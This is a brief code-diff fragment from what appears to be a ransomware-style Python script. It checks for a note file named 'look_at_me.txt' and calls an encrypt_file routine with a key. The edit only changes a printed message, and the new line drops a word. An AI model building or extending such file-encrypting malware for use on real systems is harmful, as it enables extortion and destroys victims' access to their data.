@@ -47,7 +47,7 @@ def main() -> None:
         notification_file_path = os.path.join(directory, 'look_at_me.txt')
 
         if os.path.exists(notification_file_path):
-            print("[x] The file is already encrypted. ")
+            print(f"[x] The file {encrypted} already encrypted. ")
 
         ramskit.encrypt_file([encrypted], key)
         print("[x] File encrypted. ")
